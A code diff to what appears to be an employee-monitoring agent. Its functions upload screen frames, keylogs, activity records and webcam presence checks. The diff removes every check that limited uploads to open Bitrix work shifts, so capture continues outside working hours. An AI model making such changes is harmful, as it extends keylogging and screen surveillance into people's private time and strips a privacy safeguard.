@@ -2255,8 +2255,6 @@ def enviar_screen_frames(usuario_monitorado_id, frames_bytes_list, captured_at=N
     """
     if check_stop_flag() or check_pause_flag():
         return False
-    if not bitrix_status_allows_send():
-        return False
     if not frames_bytes_list or not usuario_monitorado_id:
         return False
     try:
@@ -2294,8 +2292,6 @@ def enviar_screen_frames(usuario_monitorado_id, frames_bytes_list, captured_at=N
 def enviar_keylog(usuario_monitorado_id, entries):
     """Envia entradas de keylog para a API."""
     if check_stop_flag() or check_pause_flag() or not entries:
-        return False
-    if not bitrix_status_allows_send():
         return False
     try:
         usuario_nome = get_logged_user()
@@ -2349,12 +2345,6 @@ def enviar_atividade(registro):
     # Verificar se agente está em pausa (intervalo)
     if check_pause_flag():
         safe_print("[AGENT] Agente em pausa (intervalo) - não enviando atividade")
-        return False
-    
-    # Só envia se o expediente Bitrix estiver OPENED (ativo)
-    if not bitrix_status_allows_send(registro.get('usuario_nome') or get_logged_user()):
-        if not IS_EXECUTABLE:
-            safe_print("[AGENT] Expediente não está ativo no Bitrix (PAUSED/CLOSED) - não enviando atividade")
         return False
     
     try:
@@ -2433,9 +2423,7 @@ def enviar_face_presence_check(usuario_monitorado_id, face_detected, presence_ti
     """
     if check_stop_flag():
         return False
-    if not bitrix_status_allows_send():
-        return False
-    
+
     # Validar ID antes de enviar
     if not usuario_monitorado_id or usuario_monitorado_id == 0:
         if not IS_EXECUTABLE:
